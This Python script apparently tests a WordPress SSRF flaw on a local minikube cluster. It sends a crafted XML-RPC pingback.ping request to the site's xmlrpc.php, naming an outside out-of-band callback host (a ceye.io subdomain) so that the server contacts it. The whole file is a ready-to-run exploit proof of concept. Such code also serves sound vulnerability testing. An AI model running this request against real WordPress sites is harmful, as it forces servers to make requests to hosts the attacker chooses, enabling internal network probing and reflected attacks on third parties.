import requests
import subprocess

get_service = subprocess.run(['minikube', 'service', 'wordpress', '--url'], stdout=subprocess.PIPE)
service_url = get_service.stdout.decode('utf-8').strip()
print(f"Service IP: {service_url}")

url = service_url + "/xmlrpc.php"
print(url)

# set http header
headers = {
    'Host': service_url.replace('http://', ''),
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'wordpress_test_cookie=WP Cookie check',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# post data
data = f'''<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://r.jchi3o.ceye.io/</string></value>
</param><param><value><string>{service_url}/</string></value></param></params>
</methodCall>'''

# send post request
response = requests.post(url, headers=headers, data=data)

# print content
print(response.text)